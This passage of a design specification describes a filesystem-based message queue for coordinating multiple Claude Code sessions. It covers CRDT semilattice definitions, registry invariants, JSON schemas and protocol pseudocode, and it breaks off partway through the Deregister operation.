# OPENSPEC — say-to-claude-team

**Status:** COMPLETE
**Last Updated:** 2026-04-10
**Version:** 1.0.0

## Changelog

| Date | Agent | Change |
|------|-------|--------|
| 2026-04-10 | orchestrator | Created OPENSPEC skeleton |
| 2026-04-10 | crdt-theorist | §1 Glossaire + §2 Invariants: formal CRDT definitions, semilattice proofs, GC safety, extensions |
| 2026-04-10 | fs-atomicity-researcher | §5 Atomicity Guarantees — POSIX & macOS/APFS analysis, operation table, risks |
| 2026-04-10 | protocol-architect | §3 Data Model (schemas, lifecycle), §4 Protocol Specification (7 ops with pseudocode), §6 Scripts Interface (detailed) |
| 2026-04-10 | persona-writer | §7 Agent Personas (sender, receiver, coordinator), §8 SKILL.md Outline, SKILL.md rewritten, agents/ created |
| 2026-04-10 | edge-case-tester | §9 Edge Cases & Failure Modes (28 cases, 2 bugs found: EC-15 gc dotfile glob, EC-23 mktemp collision); tests/test-suite.sh (60 tests, 57 pass) |
| 2026-04-10 | security-auditor | §10 Security Model — threat model, 11 vulnerability findings (V1-V11), 4 scripts fixed (heredoc injection, path validation, reply_to validation, file permissions) |
| 2026-04-10 | doc-synthesizer | v1.0.0 — cross-consistency pass: EC-15 and EC-23 confirmed fixed in gc.sh/register.sh; §6.3-6.4 exit code table corrected (send.sh exit 2 added); OPENSPEC promoted to COMPLETE |

---

## 1. Glossaire

<!-- Owner: crdt-theorist -->

> **Sources théoriques :**
> - Shapiro, Preguiça, Baquero, Zawirski. *A comprehensive study of Convergent and Commutative Replicated Data Types.* INRIA TR 7506, 2011. ([PDF](https://inria.hal.science/inria-00555588/document))
> - Shapiro, Preguiça, Baquero, Zawirski. *Conflict-free Replicated Data Types.* SSS 2011. ([PDF](https://www.lip6.fr/Marc.Shapiro/papers/2011/CRDTs_SSS-2011.pdf))
> - Almeida, Shoker, Baquero. *Delta State Replicated Data Types.* J. Parallel Distrib. Comput., 2018. ([PDF](https://arxiv.org/pdf/1603.01529))

### Termes fondamentaux

| Terme | Définition |
|-------|-----------|
| **Session** | Une instance Claude Code identifiée par son PID. Chaque session active détient exactement un *bit-position* dans le système. |
| **Bit-position** (*bit*) | Entier naturel `b ∈ ℕ` assigné de manière unique à une session active. Les bits sont recyclés après déregistration. Notation : `b_i` pour la session `i`. |
| **Bitmask** | Entier naturel interprété comme un ensemble de bit-positions. Le bit `b` est « set » ssi le bit `b` de la représentation binaire vaut 1. Formellement : `mask ∈ ℕ`, et `b ∈ mask ⟺ (mask >> b) & 1 = 1`. |
| **Payload** | Le contenu applicatif d'un message (`payload.json`), opaque pour le protocole CRDT. |
| **Ack-file** | Fichier vide nommé `ack/<b>` dans le dossier d'un message. Sa simple existence encode le fait que la session de bit `b` a lu le message. Créé une fois, jamais supprimé (sauf GC du message entier). |
| **Required-mask** (`R`) | Bitmask stocké dans le fichier `required` d'un message. Encode l'ensemble des sessions qui doivent accuser réception. `R = ∑_{i ∈ readers} 2^{b_i}`. |
| **Ack-mask** (`A`) | Bitmask **calculé** (jamais stocké) par OR-réduction des ack-files présents : `A = ∑_{b : ack/<b> exists} 2^b`. C'est la valeur observée de l'état du G-Set. |
| **Message** | Un dossier `messages/<uuid>/` contenant `payload.json`, `required`, et le sous-dossier `ack/`. |

### Termes CRDT

| Terme | Définition |
|-------|-----------|
| **Partial Order** (≤) | Relation binaire réflexive, antisymétrique et transitive. Ici : l'inclusion d'ensemble sur les bits ackés, ou de manière équivalente `A₁ ≤ A₂ ⟺ A₁ & A₂ = A₁` (inclusion au sens bitmask). |
| **Join** (⊔) | Opérateur de borne supérieure (least upper bound). Pour deux ack-masks : `A₁ ⊔ A₂ = A₁ | A₂` (OR bit-à-bit). |
| **Lattice-bottom** (⊥) | Plus petit élément du treillis. Ici : `⊥ = 0` (aucun ack). |
| **Lattice-top** (⊤) | Plus grand élément (quand le treillis est borné). Ici : `⊤ = R` (le required-mask). Atteint quand tous les readers ont ack. |
| **Semilattice** | Ensemble partiellement ordonné où toute paire d'éléments a un join. Notre espace d'ack-masks forme un **join-semilattice** borné `(2^Bits, |, ≤, 0, R)` où `2^Bits` est le power-set des bit-positions dans `R`. |
| **G-Set** (*Grow-only Set*) | CRDT d'ensemble qui ne supporte que l'ajout — jamais la suppression. Les ack-files dans `ack/` forment un G-Set : on ajoute des fichiers, on n'en retire jamais (jusqu'au GC du message entier). Ref: Shapiro et al. 2011, §3.3.1. |
| **CRDT** (*Conflict-free Replicated Data Type*) | Structure de données dont les répliques peuvent diverger puis converger automatiquement via une fonction de merge qui forme un semilattice. Notre système est un **state-based CRDT** (CvRDT) : l'état est matérialisé par le filesystem et le merge est le OR des ack-files. |
| **Monotonic merge** | Propriété fondamentale : le merge ne fait jamais descendre l'état. `∀ A, A' : A ⊔ A' ≥ A`. Garantie structurellement car `a | b ≥ a` pour tout entier. |

---

## 2. Invariants

<!-- Owner: crdt-theorist -->

### 2.1 Espace d'états et opérateur join

Pour un message donné avec required-mask `R`, l'espace d'états est :

```
S = { A ∈ ℕ | A & R = A }
```

Autrement dit, `S` est le **power-set** des bits de `R`, encodé comme bitmask. C'est l'ensemble de tous les sous-ensembles possibles d'ack-files.

- **Cardinal** : `|S| = 2^(popcount(R))`
- **Bottom** : `⊥ = 0` (aucun ack)
- **Top** : `⊤ = R` (tous les acks reçus)
- **Join** : `A₁ ⊔ A₂ = A₁ | A₂` (OR bit-à-bit)
- **Partial order** : `A₁ ≤ A₂ ⟺ A₁ | A₂ = A₂` (i.e. `A₁` est un sous-ensemble de `A₂`)

La structure `(S, ⊔, ≤, ⊥, ⊤)` forme un **treillis booléen fini**, qui est un cas particulier de join-semilattice borné.

### 2.2 Preuve des propriétés du semilattice

L'opérateur join `⊔ = |` (OR bit-à-bit) satisfait les trois propriétés requises pour un semilattice :

**Idempotence** : `∀ A ∈ S : A ⊔ A = A`

> Preuve : `A | A = A` est une propriété fondamentale du OR bit-à-bit. Chaque bit vaut `max(x, x) = x`.
> *Conséquence pratique :* si une session ack deux fois le même message (crée `ack/<b>` deux fois), le résultat est identique. Les ré-acks sont inoffensifs.

**Commutativité** : `∀ A₁, A₂ ∈ S : A₁ ⊔ A₂ = A₂ ⊔ A₁`

> Preuve : `A₁ | A₂ = A₂ | A₁` car le OR est commutatif bit par bit.
> *Conséquence pratique :* l'ordre dans lequel les sessions créent leurs ack-files n'a aucune importance. Deux sessions qui ack simultanément produisent le même état final quel que soit l'ordre d'observation.

**Associativité** : `∀ A₁, A₂, A₃ ∈ S : (A₁ ⊔ A₂) ⊔ A₃ = A₁ ⊔ (A₂ ⊔ A₃)`

> Preuve : `(A₁ | A₂) | A₃ = A₁ | (A₂ | A₃)` car le OR est associatif bit par bit.
> *Conséquence pratique :* le calcul de l'ack-mask par scan du dossier `ack/` est correct quel que soit l'ordre d'itération sur les fichiers.

**Corollaire (convergence) :** Puisque `(S, ⊔)` est un semilattice et que les mutations (ajout d'ack-files) sont monotones, toute séquence de mutations finit par converger vers un point fixe. C'est le théorème fondamental des CvRDTs (Shapiro et al. 2011, Théorème 2.1).

### 2.3 Monotonie

**Propriété :** L'état d'un message ne descend jamais dans le treillis.

```
∀ A ∈ S, ∀ b ∈ R : A' = A | 2^b  ⟹  A' ≥ A
```

**Garanties structurelles :**

1. **Les ack-files ne sont jamais supprimés** — un fichier `ack/<b>` une fois créé persiste jusqu'au GC du message entier. Il n'existe pas d'opération "un-ack".
2. **L'OR ne peut qu'ajouter des bits** — `∀ a, b : a | b ≥ a`.
3. **Le filesystem est le medium de convergence** — les sessions n'échangent pas d'état directement. Le dossier `ack/` **est** l'état partagé. Chaque session « merge » en lisant le dossier (OR-réduction) et « mute » en créant un fichier.

**Anti-pattern interdit :** Aucun code ne doit jamais `rm` un fichier dans `ack/` individuellement. La seule suppression autorisée est `rm -rf messages/<uuid>/` lors du GC.

### 2.4 Sécurité du Garbage Collection

**Invariant GC :**

```
∀ msg : gc(msg) ⟹ ack_mask(msg) = required_mask(msg)
```

Autrement dit, un message ne peut être garbage-collecté que lorsque **tous** les readers requis ont accusé réception.

**Vérification :** Le processus de GC doit :
1. Lire `required` → obtenir `R`
2. Lister `ack/*` → calculer `A = OR(2^b for b in ack-files)`
3. Vérifier `A = R` (ou de manière équivalente, `A & R = R`, ou `R & ~A = 0`)
4. Seulement alors supprimer le dossier `messages/<uuid>/`

**Fenêtre de course (race window) :** Entre l'étape 3 et l'étape 4, une session pourrait se déregistrer, changeant le `registry`. Ceci est **sûr** car :
- Le `required` du message est figé à l'envoi (snapshot des sessions actives)
- La déregistration d'une session ne modifie pas le `required` des messages déjà postés
- Le GC est conservatif : il vérifie l'état réel du dossier `ack/`, pas la registry

**Propriété de sûreté (safety) :** Aucun message n'est supprimé avant d'avoir été lu par tous ses destinataires. C'est une propriété **safety** (quelque chose de mauvais ne se produit jamais), pas une propriété **liveness**.

**Propriété de vivacité (liveness) :** Si toutes les sessions requises finissent par lire et ack le message, et qu'un processus de GC finit par s'exécuter, alors le message sera éventuellement collecté. La liveness dépend de :
- La vivacité des sessions (elles doivent poll et ack)
- La détection de sessions mortes (heartbeat + nettoyage)

### 2.5 Invariants de la Registry

La registry (`registry.json`) maintient le mapping sessions ↔ bit-positions et doit respecter :

**INV-R1 — Unicité des bits :**
```
∀ s₁, s₂ ∈ active_sessions : s₁ ≠ s₂ ⟹ bit(s₁) ≠ bit(s₂)
```
Deux sessions actives ne partagent jamais le même bit. Garanti par le lock advisory (`registry.lock` + `lockf`).

**INV-R2 — Validité des bits :**
```
∀ s ∈ active_sessions : bit(s) ∈ ℕ
```
Les bits sont des entiers naturels (0, 1, 2, ...).

**INV-R3 — Compacité (soft) :**
```
max(bit(s) for s in active_sessions) < |active_sessions| + |recycled_bits|
```
Les bits doivent rester raisonnablement petits pour que les bitmasks restent manipulables. Les bits des sessions déregistrées doivent être recyclés (réutilisés par les nouvelles sessions).

**INV-R4 — Cohérence PID ↔ Session :**
```
∀ s ∈ active_sessions : is_alive(pid(s)) ∨ is_stale(s)
```
Si le PID d'une session n'existe plus, la session est considérée stale et doit être nettoyée par le mécanisme de heartbeat. Le bit est alors recyclé.

**INV-R5 — Atomicité des mutations registry :**
Toute modification de `registry.json` doit être faite sous le lock `registry.lock`. Séquence : `lockf(lock) → read(registry) → modify → write(registry) → unlock(lock)`.

### 2.6 Extensions possibles

#### 2.6.1 Anti-entropy passive

Le modèle actuel est **anti-entropie par observation** : chaque session poll le filesystem et reconstruit l'état localement. C'est un modèle pull-only, simple mais avec une latence proportionnelle à l'intervalle de polling.

**Extension possible :** Ajouter un mécanisme de notification (ex: `fsnotify`, signaux Unix) pour réduire la latence sans changer le modèle CRDT. L'état reste dans le filesystem ; la notification est un hint, pas une source de vérité.

#### 2.6.2 Bounded semilattice pour TTL

Le semilattice actuel est borné par `⊤ = R` (tous les acks reçus). On pourrait ajouter une **dimension temporelle** :

```
S_ttl = S × {alive, expired}
```

Quand `now > timestamp + ttl`, le message passe en état `expired` et devient éligible au GC **même sans** avoir `A = R`. Cela crée un **bounded join-semilattice** où le top est atteint soit par complétion des acks, soit par expiration du TTL :

```
gc(msg) ⟺ ack_mask(msg) = required_mask(msg) ∨ expired(msg)
```

Cette extension préserve toutes les propriétés CRDT (le TTL est monotone : un message expiré ne redevient jamais vivant).

#### 2.6.3 Delta-CRDT pour optimiser le polling

Dans le modèle actuel, chaque `poll` doit lister **tous** les messages et lire leurs ack-files. Avec un grand nombre de messages, cela devient coûteux.

**Optimisation delta-CRDT (Almeida et al. 2018) :** Chaque session pourrait maintenir un fichier `.sessions/<PID>.cursor` contenant le timestamp du dernier poll. Le scan ne considère alors que les messages modifiés depuis le curseur (`stat` sur les dossiers `ack/`).

Ce n'est pas un delta-CRDT au sens strict (pas de delta-mutators), mais le principe est le même : **ne transmettre que l'incrément** plutôt que l'état entier.

#### 2.6.4 Lattice produit pour messages multi-champs

Si le payload devait supporter des champs modifiables (ex: priorité, statut), on pourrait étendre le treillis en un **lattice produit** :

```
S_extended = S_ack × S_priority × S_status
```

Chaque dimension serait un semilattice indépendant, et le join serait le join composante par composante. Cela permettrait d'évoluer vers un système de messaging plus riche tout en conservant les propriétés CRDT. Pour l'instant, cela n'est pas nécessaire — le payload est immutable.

---

## 3. Data Model

<!-- Owner: protocol-architect -->

### 3.1 Directory Structure

```
~/.claude/team-queue/                    # TEAM_QUEUE_DIR — root, all on same FS
  registry.json                          # Session registry (protected by lockf)
  registry.lock                          # Advisory lock file (never deleted)
  .sessions/                             # Per-session local state
    <PID>.bit                            # Contains the decimal bit-position
    <PID>.start_time                     # Contains epoch seconds of process start
  messages/                              # Published messages
    <msg-id>/                            # One directory per message (UUID v4)
      payload.json                       # Message content (immutable after publish)
      required                           # Decimal bitmask of required readers
      ack/                               # Ack G-Set directory
        <bit>                            # Empty file — session <bit> has read
    .tmp-<uuid>/                         # Staging area (invisible to poll)
      payload.json
      required
      ack/
```

### 3.2 Message ID Convention

Message IDs are **UUID v4** (lowercase, hyphenated: `xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx`).

Generated via `uuidgen | tr '[:upper:]' '[:lower:]'` on macOS.

**Rationale:** UUID v4 avoids collisions without coordination. Timestamp-based IDs were rejected because they create ordering assumptions and can collide under concurrent sends.

### 3.3 payload.json Schema

```json
{
  "id": "<uuid-v4>",
  "timestamp": "<ISO 8601 with timezone, e.g. 2026-04-10T14:30:00Z>",
  "sender": {
    "bit": 0,
    "name": "session-name",
    "pid": 12345,
    "start_time": 1712750000
  },
  "target": "all | <session-name>",
  "type": "text | command | query",
  "body": "<message content, UTF-8 string>",
  "metadata": {
    "priority": "normal | high",
    "ttl_seconds": 3600
  },
  "in_reply_to": "<uuid-v4> | null"
}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `id` | string (UUID v4) | Yes | Unique message identifier, matches directory name |
| `timestamp` | string (ISO 8601) | Yes | Creation time with timezone |
| `sender.bit` | integer >= 0 | Yes | Sender's bit-position at send time |
| `sender.name` | string | Yes | Sender's registered name |
| `sender.pid` | integer | Yes | Sender's process ID |
| `sender.start_time` | integer (epoch) | Yes | Sender's process start time — mitigates PID recycling (§5.7 Risk 4) |
| `target` | string | Yes | `"all"` for broadcast, or a session name for directed message |
| `type` | enum | Yes | `"text"`, `"command"`, or `"query"` |
| `body` | string | Yes | UTF-8 message content |
| `metadata.priority` | enum | No | `"normal"` (default) or `"high"` |
| `metadata.ttl_seconds` | integer > 0 | No | Time-to-live in seconds. Default: 3600 (1 hour) |
| `in_reply_to` | string or null | No | UUID of the message being replied to, or null |

### 3.4 registry.json Schema

```json
{
  "version": 1,
  "sessions": {
    "<session-name>": {
      "bit": 0,
      "pid": 12345,
      "start_time": 1712750000,
      "registered_at": "2026-04-10T14:30:00Z",
      "last_heartbeat": "2026-04-10T14:35:00Z"
    }
  },
  "next_bit": 3,
  "recycled_bits": [1]
}
```

| Field | Type | Description |
|-------|------|-------------|
| `version` | integer | Schema version, currently `1` |
| `sessions` | object | Map of session-name → session record |
| `sessions.<name>.bit` | integer >= 0 | Assigned bit-position (unique per INV-R1) |
| `sessions.<name>.pid` | integer | OS process ID |
| `sessions.<name>.start_time` | integer (epoch) | Process start time from `/proc` or `ps` — used to detect PID recycling |
| `sessions.<name>.registered_at` | string (ISO 8601) | When the session registered |
| `sessions.<name>.last_heartbeat` | string (ISO 8601) | Last heartbeat timestamp, used for stale detection |
| `next_bit` | integer >= 0 | Next bit to assign if `recycled_bits` is empty |
| `recycled_bits` | array of integers | Bits freed by deregistered sessions, reused FIFO |

**Initialization:** If `registry.json` does not exist, create it with `{"version":1,"sessions":{},"next_bit":0,"recycled_bits":[]}`.

**Corruption recovery:** If `registry.json` fails JSON parse, the operation MUST abort with exit code 10. The operator must manually restore from the last known good state or reset the file. Automated recovery is intentionally not provided — a corrupt registry indicates a bug, not a recoverable error.

### 3.5 .sessions/<PID>.bit File

Plain text file containing a single decimal integer: the bit-position assigned to this session.

- **Created by:** `register.sh` after successful registry update
- **Read by:** `send.sh`, `poll.sh`, `ack.sh`, `heartbeat.sh` to determine `TEAM_SESSION_BIT`
- **Deleted by:** `deregister.sh` during cleanup
- **Format:** `echo "$BIT" > .sessions/$$.bit`

### 3.6 .sessions/<PID>.start_time File

Plain text file containing the epoch seconds when the process started.

- **Created by:** `register.sh` alongside the `.bit` file
- **Read by:** GC to validate that a PID still belongs to the original session
- **Deleted by:** `deregister.sh` during cleanup
- **Format:** `echo "$START_TIME" > .sessions/$$.start_time`

### 3.7 required File

Plain text file containing a single decimal integer representing the bitmask of required readers.

- **Format:** `echo "$REQUIRED_MASK" > required`
- **Example:** If sessions with bits 0, 2, 3 must read: `required` contains `13` (binary `1101`)
- **Immutable** after message publication (rename from `.tmp-`)

### 3.8 Lifecycle Diagram

```
 ┌─────────────────────────────────────────────────────────────────┐
 │                    MESSAGE LIFECYCLE                            │
 └─────────────────────────────────────────────────────────────────┘

  Session A                    Filesystem                  Session B
  ─────────                    ──────────                  ─────────
      │                            │                           │
      │  register("A")             │                           │
      ├───────────────────────────►│ registry.json updated     │
      │  .sessions/$$.bit created  │                           │
      │                            │                           │
      │                            │   register("B")           │
      │                            │◄──────────────────────────┤
      │                            │ registry.json updated     │
      │                            │ .sessions/$$.bit created  │
      │                            │                           │
      │  post("all","text","hi")   │                           │
      ├──┐                         │                           │
      │  │ 1. read registry        │                           │
      │  │ 2. compute required     │                           │
      │  │ 3. mkdir .tmp-<uuid>    │                           │
      │  │ 4. write payload.json   │                           │
      │  │ 5. write required       │                           │
      │  │ 6. rename → <uuid>      │                           │
      │  └────────────────────────►│ messages/<uuid>/ visible  │
      │                            │                           │
      │                            │         poll()            │
      │                            │◄──────────────────────────┤
      │                            │  scan messages/           │
      │                            │  filter by bit            │
      │                            ├──────────────────────────►│
      │                            │  return [payload]         │
      │                            │                           │
      │                            │     ack(<uuid>)           │
      │                            │◄──────────────────────────┤
      │                            │  touch ack/<bit_B>        │
      │                            │                           │
      │  ack(<uuid>)               │                           │
      ├───────────────────────────►│  touch ack/<bit_A>        │
      │                            │                           │
      │  gc()                      │                           │
      ├──┐                         │                           │
      │  │ ack_mask == required?   │                           │
      │  │ YES → rm -rf <uuid>/   │                           │
      │  └────────────────────────►│ message deleted           │
      │                            │                           │
      │  deregister()              │                           │
      ├───────────────────────────►│ registry.json updated     │
      │                            │ bit recycled              │
      │                            │ .sessions files removed   │
      │                            │                           │
```

---

## 4. Protocol Specification

<!-- Owner: protocol-architect -->

### 4.1 Register(name)

Assigns a bit-position to a new session and records it in the registry.

**Preconditions:**
- `name` is a non-empty string matching `[a-zA-Z0-9_-]+`
- No active session with the same `name` exists in the registry
- The calling process has a valid PID (`$$`)

**Algorithm:**

```
FUNCTION Register(name):
    queue_dir = TEAM_QUEUE_DIR                      # ~/.claude/team-queue/
    mkdir -p "$queue_dir/.sessions"
    mkdir -p "$queue_dir/messages"

    start_time = get_process_start_time($$)         # ps -o lstart= -p $$ | date epoch

    lockf "$queue_dir/registry.lock":               # §5.6 — advisory lock
        registry = read_json("$queue_dir/registry.json")
        IF parse_error:
            EXIT 10                                 # Corrupt registry — abort

        IF name IN registry.sessions:
            existing = registry.sessions[name]
            IF is_alive(existing.pid) AND get_process_start_time(existing.pid) == existing.start_time:
                EXIT 2                              # Name already taken by live session
            ELSE:
                # Stale entry — reap it first
                recycled_bits.push(existing.bit)
                DELETE registry.sessions[name]

        # Allocate bit — prefer recycled bits (INV-R3 compactness)
        IF registry.recycled_bits is non-empty:
            bit = registry.recycled_bits.shift()    # FIFO pop
        ELSE:
            bit = registry.next_bit
            registry.next_bit += 1

        # Drain messages with stale acks for this recycled bit
        FOR each msg_dir IN messages/*:
            IF file_exists("$msg_dir/ack/$bit"):
                rm "$msg_dir/ack/$bit"              # Clear stale ack from previous owner

        registry.sessions[name] = {
            bit: bit,
            pid: $$,
            start_time: start_time,
            registered_at: now_iso8601(),
            last_heartbeat: now_iso8601()
        }

        write_json("$queue_dir/registry.json", registry)
    # lock released

    echo "$bit" > "$queue_dir/.sessions/$$.bit"
    echo "$start_time" > "$queue_dir/.sessions/$$.start_time"

    stdout: "$bit"
    EXIT 0
```

**Postconditions:**
- `registry.json` contains an entry for `name` with a unique bit (INV-R1)
- `.sessions/<PID>.bit` exists with the assigned bit
- `.sessions/<PID>.start_time` exists with process start epoch
- Any stale ack files for the recycled bit have been drained

**Invariants respected:** INV-R1 (uniqueness), INV-R2 (validity), INV-R3 (compactness), INV-R5 (atomicity under lock)

**Atomicity:** Registry mutation under `lockf` (§5.6). Bit file writes are not atomic but are only read by the owning process.

**Exit codes:**
| Code | Meaning |
|------|---------|
| 0 | Success |
| 2 | Name already taken by a live session |
| 10 | Registry corrupt (JSON parse failure) |
| 11 | Lock acquisition failed |

---

### 4.2 Post(target, type, body)

Creates and atomically publishes a new message.

**Preconditions:**
- Caller is registered (`.sessions/$$.bit` exists)
- `target` is `"all"` or a valid session name
- `type` is one of `"text"`, `"command"`, `"query"`
- `body` is a non-empty UTF-8 string

**Algorithm:**

```
FUNCTION Post(target, type, body):
    queue_dir = TEAM_QUEUE_DIR
    my_bit = read("$queue_dir/.sessions/$$.bit")
    msg_id = uuidgen | tr upper lower

    # Read registry to compute required mask
    # No lock needed — snapshot read, stale data is safe (worst case: extra reader)
    registry = read_json("$queue_dir/registry.json")
    IF parse_error:
        EXIT 10

    IF target == "all":
        # All active sessions EXCEPT sender
        required = 0
        FOR each session IN registry.sessions:
            IF session.bit != my_bit:
                required = required | (1 << session.bit)
    ELSE:
        IF target NOT IN registry.sessions:
            EXIT 1                                  # No such recipient
        target_bit = registry.sessions[target].bit
        IF target_bit == my_bit:
            EXIT 3                                  # Cannot send to self
        required = 1 << target_bit

    IF required == 0:
        EXIT 1                                      # No recipients

    # Build payload
    start_time = read("$queue_dir/.sessions/$$.start_time")
    sender_name = lookup_name_by_bit(registry, my_bit)
    payload = {
        id: msg_id,
        timestamp: now_iso8601(),
        sender: { bit: my_bit, name: sender_name, pid: $$, start_time: start_time },
        target: target,
        type: type,
        body: body,
        metadata: { priority: "normal", ttl_seconds: 3600 },
        in_reply_to: null
    }

    # Write-to-tmp-then-rename (§5.3)
    tmp_dir = "$queue_dir/messages/.tmp-$msg_id"
    mkdir "$tmp_dir"                                # Step 1 — atomic (§5.1)
    mkdir "$tmp_dir/ack"                            # Step 2
    write_json "$tmp_dir/payload.json" payload      # Step 3 — non-atomic but invisible
    echo "$required" > "$tmp_dir/required"          # Step 4 — non-atomic but invisible
    rename "$tmp_dir" "$queue_dir/messages/$msg_id" # Step 5 — ATOMIC PUBLISH (§5.3)

    stdout: "$msg_id"
    EXIT 0
```

**Postconditions:**
- `messages/<msg_id>/` exists with `payload.json`, `required`, and empty `ack/`
- No `.tmp-*` directory remains for this message
- `required` contains a bitmask with at least one bit set

**Invariants respected:** INV-R1 (reads bit assignments), INV-R5 (no registry mutation needed)

**Atomicity:** Message publication is atomic via `rename()` (§5.3). The message is either fully visible or not at all.

**Exit codes:**
| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | No recipients (target not found or no other sessions) |
| 2 | Invalid arguments (missing args, bad type, bad priority, bad reply_to) |
| 3 | Cannot send to self |
| 10 | Registry corrupt |
| 12 | Staging directory creation failed |

---

### 4.3 Poll()

Scans published messages and returns those relevant to the caller.

**Preconditions:**
- Caller is registered (`.sessions/$$.bit` exists)

**Algorithm:**

```
FUNCTION Poll():
    queue_dir = TEAM_QUEUE_DIR
    my_bit = read("$queue_dir/.sessions/$$.bit")
    results = []

    FOR each entry IN readdir("$queue_dir/messages/"):
        # Skip dotfiles, .tmp-* staging dirs, and . / ..
        IF entry starts with "." OR entry starts with "..":
            CONTINUE

        msg_dir = "$queue_dir/messages/$entry"

        # Defensive: handle ENOENT from concurrent GC (§5.4)
        required = try_read("$msg_dir/required")
        IF required is ENOENT:
            CONTINUE                                # Message deleted mid-scan

        required_int = parse_int(required)

        # Check if my bit is in the required mask
        IF (required_int >> my_bit) & 1 == 0:
            CONTINUE                                # Not a recipient

        # Check if already acked
        IF file_exists("$msg_dir/ack/$my_bit"):
            CONTINUE                                # Already read

        payload = try_read_json("$msg_dir/payload.json")
        IF payload is ENOENT:
            CONTINUE                                # Concurrent GC

        results.append(payload)

    # Sort by timestamp ascending (oldest first)
    sort results by .timestamp ASC

    IF results is empty:
        stdout: "[]"
        EXIT 1                                      # No messages
    ELSE:
        stdout: json_encode(results)
        EXIT 0
```

**Postconditions:**
- Returns a JSON array of payload objects for unacked messages targeting the caller
- No filesystem mutations — poll is read-only

**Invariants respected:** INV-R1 (bit uniqueness ensures correct filtering)

**Atomicity:** No atomic operations required. `readdir()` may miss concurrent publications — acceptable (§5.4, §5.7 Risk 5). ENOENT handled for concurrent GC (§5.5).

**Exit codes:**
| Code | Meaning |
|------|---------|
| 0 | One or more messages returned |
| 1 | No pending messages |
| 10 | Registry corrupt or bit file missing |

---

### 4.4 Ack(msg_id)

Acknowledges receipt of a message by creating an ack file.

**Preconditions:**
- Caller is registered (`.sessions/$$.bit` exists)
- `msg_id` is a valid UUID v4 string

**Algorithm:**

```
FUNCTION Ack(msg_id):
    queue_dir = TEAM_QUEUE_DIR
    my_bit = read("$queue_dir/.sessions/$$.bit")
    msg_dir = "$queue_dir/messages/$msg_id"

    # Verify message exists
    IF NOT dir_exists(msg_dir):
        EXIT 4                                      # Message not found

    # Verify caller is a required reader
    required = read("$msg_dir/required")
    required_int = parse_int(required)
    IF (required_int >> my_bit) & 1 == 0:
        EXIT 5                                      # Not a recipient of this message

    # Create ack file — idempotent (§5.1, §5.7 Risk 7)
    touch "$msg_dir/ack/$my_bit"                    # O_CREAT — safe if exists

    EXIT 0
```

**Postconditions:**
- `messages/<msg_id>/ack/<my_bit>` exists
- The ack-mask for this message has monotonically increased or stayed the same (§2.3)

**Invariants respected:** G-Set monotonicity (§2.3), idempotent acks (§2.2 idempotence proof)

**Atomicity:** `touch` uses `open(O_CREAT)` which is atomic for file creation (§5.1). Idempotent — re-acking is safe.

**Exit codes:**
| Code | Meaning |
|------|---------|
| 0 | Success (or already acked — idempotent) |
| 4 | Message not found |
| 5 | Caller is not a recipient |
| 10 | Bit file missing |

---

### 4.5 GC()

Garbage-collects fully-acked messages, expired messages, orphaned staging dirs, and dead sessions.

**Preconditions:**
- Caller is registered (`.sessions/$$.bit` exists) — OR running as a standalone maintenance process

**Algorithm:**

```
FUNCTION GC():
    queue_dir = TEAM_QUEUE_DIR
    deleted_count = 0
    now = current_epoch_seconds()

    # ── Phase 1: Clean fully-acked and expired messages ──

    FOR each entry IN readdir("$queue_dir/messages/"):
        IF entry starts with ".":
            # Phase 1b: Clean orphaned .tmp-* dirs older than 60s
            IF entry starts with ".tmp-":
                tmp_dir = "$queue_dir/messages/$entry"
                age = now - mtime(tmp_dir)
                IF age > 60:                        # §5.7 Risk 2
                    rm -rf "$tmp_dir"
                    deleted_count += 1
            CONTINUE

        msg_dir = "$queue_dir/messages/$entry"

        required = try_read("$msg_dir/required")
        IF required is ENOENT:
            CONTINUE

        required_int = parse_int(required)

        # Compute ack_mask by OR-reduction of ack files (§2.1)
        ack_mask = 0
        FOR each ack_file IN readdir("$msg_dir/ack/"):
            IF ack_file == "." OR ack_file == "..":
                CONTINUE
            bit = parse_int(ack_file)
            ack_mask = ack_mask | (1 << bit)

        # Check full ack: A & R == R  (§2.4)
        fully_acked = (ack_mask & required_int) == required_int

        # Check TTL expiry (§2.6.2)
        payload = try_read_json("$msg_dir/payload.json")
        expired = false
        IF payload is not ENOENT:
            ttl = payload.metadata.ttl_seconds OR 3600
            msg_time = parse_iso8601(payload.timestamp)
            IF now - msg_time > ttl:
                expired = true

        IF fully_acked OR expired:
            rm -rf "$msg_dir"                       # §5.5 — safe with concurrent readers
            deleted_count += 1

    # ── Phase 2: Reap dead sessions ──

    lockf "$queue_dir/registry.lock":
        registry = read_json("$queue_dir/registry.json")
        IF parse_error:
            EXIT 10

        stale_threshold = 300                       # 5 minutes without heartbeat

        FOR each name, session IN registry.sessions:
            is_dead = false

            # Check 1: PID liveness + start_time (mitigates §5.7 Risk 4)
            IF NOT is_alive(session.pid):
                is_dead = true
            ELSE IF get_process_start_time(session.pid) != session.start_time:
                is_dead = true                      # PID recycled

            # Check 2: Heartbeat timeout
            IF NOT is_dead:
                last_hb = parse_iso8601(session.last_heartbeat)
                IF now - last_hb > stale_threshold:
                    is_dead = true

            IF is_dead:
                registry.recycled_bits.push(session.bit)
                DELETE registry.sessions[name]
                rm -f "$queue_dir/.sessions/${session.pid}.bit"
                rm -f "$queue_dir/.sessions/${session.pid}.start_time"

        write_json("$queue_dir/registry.json", registry)
    # lock released

    stdout: "$deleted_count"
    EXIT 0
```

**Postconditions:**
- All fully-acked messages have been removed
- All TTL-expired messages have been removed
- Orphaned `.tmp-*` dirs older than 60s have been removed
- Dead sessions have been deregistered and their bits recycled

**Invariants respected:** GC safety invariant (§2.4) — never deletes a message unless `A & R == R` or TTL expired. INV-R4 (stale session cleanup). INV-R5 (registry mutation under lock).

**Atomicity:** Message deletion (`rm -rf`) is not atomic but safe with concurrent readers (§5.5). Registry update under `lockf` (§5.6).

**Exit codes:**
| Code | Meaning |
|------|---------|
| 0 | Success |
| 10 | Registry corrupt |
| 11 | Lock acquisition failed |

---

### 4.6 Deregister()

Removes the current session from the registry and frees its bit.

**Preconditions:**
- Caller is registered (`.sessions/$$.bit` exists)

**Algorithm:**

```
FUNCTION Deregister():
    queue_dir = TEAM_QUEUE_DIR
    my_bit = read("$queue_dir/.sessions/$$.bit")

    lockf "$queue_dir/registry.lock":
        registry = read_json("$queue_dir/registry.json")
        IF parse_error:
            EXIT 10

        # Find and remove our session by PID match
        found = false
